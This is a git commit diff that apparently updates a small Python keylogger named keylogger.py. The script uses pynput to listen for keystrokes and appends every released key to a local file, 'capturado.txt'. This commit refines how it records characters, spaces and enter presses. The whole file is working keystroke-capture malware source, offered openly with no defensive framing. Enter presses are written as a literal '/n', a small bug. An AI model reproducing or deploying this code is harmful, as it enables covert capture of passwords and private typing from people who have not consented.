dc08c240362ce948d137732199a95c9b1a8ae2c8
José Gabriel <67514416+josefloresgabriel@users.noreply.github.com>
2020-07-14 23:02:32 -0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,11 +1,19 @@
-from pynput.keyboard import Key, Listener
+from pynput import keyboard
 
 def pressionado(Key):
     pass
 
 def soltado(Key):
     with open('capturado.txt', 'a') as file:
-        file.write(str(f'{Key}'))
+        try:
+            file.write(str(f'{Key.char}'))
+        except AttributeError:
+            if Key == keyboard.Key.space:
+                file.write(' ')
+            elif Key == keyboard.Key.enter:
+                file.write(' ' + '/n')
+            else:
+                file.write(str(f'({Key})'))
 
-with Listener(on_press=pressionado, on_release=soltado) as listener:
+with keyboard.Listener(on_press=pressionado, on_release=soltado) as listener:
     listener.join()
